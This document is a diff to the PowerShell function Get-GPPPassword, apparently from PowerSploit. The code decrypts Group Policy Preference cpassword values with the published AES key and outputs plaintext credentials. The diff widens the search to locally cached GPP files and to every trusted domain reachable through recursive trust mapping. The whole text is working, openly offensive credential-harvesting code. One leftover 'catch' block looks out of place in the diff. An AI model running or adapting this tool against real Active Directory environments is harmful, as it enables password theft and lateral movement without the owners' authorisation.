@@ -111,6 +111,9 @@ function Get-GPPPassword {
 
             $Base64Decoded = [Convert]::FromBase64String($Cpassword)
             
+            # Make sure System.Core is loaded
+            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null
+
             #Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
             [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8,
@@ -141,107 +144,204 @@ function Get-GPPPassword {
             $Filename = Split-Path $File -Leaf
             [xml] $Xml = Get-Content ($File)
 
-            #declare empty arrays
-            $Cpassword = @()
-            $UserName = @()
-            $NewName = @()
-            $Changed = @()
-            $Password = @()
-    
-            #check for password field
-            if ($Xml.innerxml -like "*cpassword*"){
-            
-                Write-Verbose "Potential password in $File"
-                
-                switch ($Filename) {
+            # check for the cpassword field
+            if ($Xml.innerxml -match 'cpassword') {
 
-                    'Groups.xml' {
-                        $Cpassword += , $Xml | Select-Xml "/Groups/User/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/Groups/User/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $NewName += , $Xml | Select-Xml "/Groups/User/Properties/@newName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/Groups/User/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                    }
-        
-                    'Services.xml' {  
-                        $Cpassword += , $Xml | Select-Xml "/NTServices/NTService/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/NTServices/NTService/Properties/@accountName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/NTServices/NTService/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                    }
-        
-                    'Scheduledtasks.xml' {
-                        $Cpassword += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/ScheduledTasks/Task/Properties/@runAs" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/ScheduledTasks/Task/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                    }
-        
-                    'DataSources.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/DataSources/DataSource/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/DataSources/DataSource/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}                          
-                    }
-                    
-                    'Printers.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/Printers/SharedPrinter/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/Printers/SharedPrinter/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                    }
-  
-                    'Drives.xml' { 
-                        $Cpassword += , $Xml | Select-Xml "/Drives/Drive/Properties/@cpassword" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $UserName += , $Xml | Select-Xml "/Drives/Drive/Properties/@userName" | Select-Object -Expand Node | ForEach-Object {$_.Value}
-                        $Changed += , $Xml | Select-Xml "/Drives/Drive/@changed" | Select-Object -Expand Node | ForEach-Object {$_.Value} 
+                $Xml.GetElementsByTagName('Properties') | ForEach-Object {
+                    if ($_.cpassword) {
+                        $Cpassword = $_.cpassword
+                        if ($Cpassword -and ($Cpassword -ne '')) {
+                           $DecryptedPassword = Get-DecryptedCpassword $Cpassword
+                           $Password = $DecryptedPassword
+                           Write-Verbose "[Get-GPPInnerField] Decrypted password in '$File'"
+                        }
+
+                        if ($_.newName) {
+                            $NewName = $_.newName
+                        }
+
+                        if ($_.userName) {
+                            $UserName = $_.userName
+                        }
+                        elseif ($_.accountName) {
+                            $UserName = $_.accountName
+                        }
+                        elseif ($_.runAs) {
+                            $UserName = $_.runAs
+                        }
+
+                        try {
+                            $Changed = $_.ParentNode.changed
+                        }
+                        catch {
+                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.changed for '$File'"
+                        }
+
+                        try {
+                            $NodeName = $_.ParentNode.ParentNode.LocalName
+                        }
+                        catch {
+                            Write-Verbose "[Get-GPPInnerField] Unable to retrieve ParentNode.ParentNode.LocalName for '$File'"
+                        }
+
+                        if (!($Password)) {$Password = '[BLANK]'}
+                        if (!($UserName)) {$UserName = '[BLANK]'}
+                        if (!($Changed)) {$Changed = '[BLANK]'}
+                        if (!($NewName)) {$NewName = '[BLANK]'}
+
+                        $GPPPassword = New-Object PSObject
+                        $GPPPassword | Add-Member Noteproperty 'UserName' $UserName
+                        $GPPPassword | Add-Member Noteproperty 'NewName' $NewName
+                        $GPPPassword | Add-Member Noteproperty 'Password' $Password
+                        $GPPPassword | Add-Member Noteproperty 'Changed' $Changed
+                        $GPPPassword | Add-Member Noteproperty 'File' $File
+                        $GPPPassword | Add-Member Noteproperty 'NodeName' $NodeName
+                        $GPPPassword | Add-Member Noteproperty 'Cpassword' $Cpassword
+                        $GPPPassword
                     }
                 }
-           }
-                     
-           foreach ($Pass in $Cpassword) {
-               Write-Verbose "Decrypting $Pass"
-               $DecryptedPassword = Get-DecryptedCpassword $Pass
-               Write-Verbose "Decrypted a password of $DecryptedPassword"
-               #append any new passwords to array
-               $Password += , $DecryptedPassword
-           }
-            
-            #put [BLANK] in variables
-            if (!($Password)) {$Password = '[BLANK]'}
-            if (!($UserName)) {$UserName = '[BLANK]'}
-            if (!($Changed)) {$Changed = '[BLANK]'}
-            if (!($NewName)) {$NewName = '[BLANK]'}
-                  
-            #Create custom object to output results
-            $ObjectProperties = @{'Passwords' = $Password;
-                                  'UserNames' = $UserName;
-                                  'Changed' = $Changed;
-                                  'NewName' = $NewName;
-                                  'File' = $File}
-                
-            $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
-            Write-Verbose "The password is between {} and may be more than one value."
-            if ($ResultsObject) {Return $ResultsObject} 
+            }
         }
+        catch {
+            Write-Warning "[Get-GPPInnerField] Error parsing file '$File' : $_"
+        }
+    }
+
+    # helper function (adapted from PowerView) to enumerate the domain/forest trusts for a specified domain
+    function Get-DomainTrust {
+        [CmdletBinding()]
+        Param (
+            $Domain
+        )
+
+        if (Test-Connection -Count 1 -Quiet -ComputerName $Domain) {
+            try {
+                $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
+                $DomainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
+                if ($DomainObject) {
+                    $DomainObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
+                }
+            }
+            catch {
+                Write-Verbose "[Get-DomainTrust] Error contacting domain '$Domain' : $_"
+            }
+
+            try {
+                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Forest', $Domain)
+                $ForestObject = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
+                if ($ForestObject) {
+                    $ForestObject.GetAllTrustRelationships() | Select-Object -ExpandProperty TargetName
+                }
+            }
+            catch {
+                Write-Verbose "[Get-DomainTrust] Error contacting forest '$Domain' (domain may not be a forest object) : $_"
+            }
+        }
+    }
+
+    # helper function (adapted from PowerView) to enumerate all reachable trusts from the current domain
+    function Get-DomainTrustMapping {
+        [CmdletBinding()]
+        Param ()
+
+        # keep track of domains seen so we don't hit infinite recursion
+        $SeenDomains = @{}
+
+        # our domain stack tracker
+        $Domains = New-Object System.Collections.Stack
+
+        try {
+            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
+            $CurrentDomain
+        }
+        catch {
+            Write-Warning "[Get-DomainTrustMapping] Error enumerating current domain: $_"
+        }
+
+        if ($CurrentDomain -and $CurrentDomain -ne '') {
+            $Domains.Push($CurrentDomain)
+
+            while($Domains.Count -ne 0) {
+
+                $Domain = $Domains.Pop()
+
+                # if we haven't seen this domain before
+                if ($Domain -and ($Domain.Trim() -ne '') -and (-not $SeenDomains.ContainsKey($Domain))) {
+
+                    Write-Verbose "[Get-DomainTrustMapping] Enumerating trusts for domain: '$Domain'"
+
+                    # mark it as seen in our list
+                    $Null = $SeenDomains.Add($Domain, '')
+
+                    try {
+                        # get all the domain/forest trusts for this domain
+                        Get-DomainTrust -Domain $Domain | Sort-Object -Unique | ForEach-Object {
+                            # only output if we haven't already seen this domain and if it's pingable
+                            if (-not $SeenDomains.ContainsKey($_) -and (Test-Connection -Count 1 -Quiet -ComputerName $_)) {
+                                $Null = $Domains.Push($_)
+                                $_
+                            }
+                        }
+                    }
+                    catch {
+                        Write-Verbose "[Get-DomainTrustMapping] Error: $_"
+                    }
+                }
+            }
+        }
+    }
 
         catch {Write-Error $Error[0]}
     }
     
     try {
-        #ensure that machine is domain joined and script is running as a domain account
-        if ( ( ((Get-WmiObject Win32_ComputerSystem).partofdomain) -eq $False ) -or ( -not $Env:USERDNSDOMAIN ) ) {
-            throw 'Machine is not a domain member or User is not a member of the domain.'
+        $XMLFiles = @()
+        $Domains = @()
+
+        $AllUsers = $Env:ALLUSERSPROFILE
+        if (-not $AllUsers) {
+            $AllUsers = 'C:\ProgramData'
         }
 
-        #discover potential files containing passwords ; not complaining in case of denied access to a directory
-        Write-Verbose "Searching \\$Server\SYSVOL. This could take a while."
-        $XMlFiles = Get-ChildItem -Path "\\$Server\SYSVOL" -Recurse -ErrorAction SilentlyContinue -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'
-    
-        if ( -not $XMlFiles ) {throw 'No preference files found.'}
+        # discover any locally cached GPP .xml files
+        Write-Verbose '[Get-GPPPassword] Searching local host for any cached GPP files'
+        $XMLFiles += Get-ChildItem -Path $AllUsers -Recurse -Include 'Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml' -Force -ErrorAction SilentlyContinue
 
-        Write-Verbose "Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
-    
-        foreach ($File in $XMLFiles) {
-            $Result = (Get-GppInnerFields $File.Fullname)
-            Write-Output $Result
+        if ($SearchForest) {
+            Write-Verbose '[Get-GPPPassword] Searching for all reachable trusts'
+            $Domains += Get-DomainTrustMapping
+        }
+        else {
+            if ($Server) {
+                $Domains += , $Server
+            }
+            else {
+                # in case we're in a SYSTEM context
+                $Domains += , [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() | Select-Object -ExpandProperty Name
+            }
+        }
+
+        $Domains = $Domains | Where-Object {$_} | Sort-Object -Unique
+
+        ForEach ($Domain in $Domains) {
+            # discover potential domain GPP files containing passwords, not complaining in case of denied access to a directory
+            Write-Verbose "[Get-GPPPassword] Searching \\$Domain\SYSVOL\*\Policies. This could take a while."
+            $DomainXMLFiles = Get-ChildItem -Force -Path "\\$Domain\SYSVOL\*\Policies" -Recurse -ErrorAction SilentlyContinue -Include @('Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml')
+
+            if($DomainXMLFiles) {
+                $XMLFiles += $DomainXMLFiles
+            }
+        }
+
+        if ( -not $XMLFiles ) { throw '[Get-GPPPassword] No preference files found.' }
+
+        Write-Verbose "[Get-GPPPassword] Found $($XMLFiles | Measure-Object | Select-Object -ExpandProperty Count) files that could contain passwords."
+
+        ForEach ($File in $XMLFiles) {
+            $Result = (Get-GppInnerField $File.Fullname)
+            $Result
         }
     }
 
-    catch {Write-Error $Error[0]}
+    catch { Write-Error $Error[0] }
 }
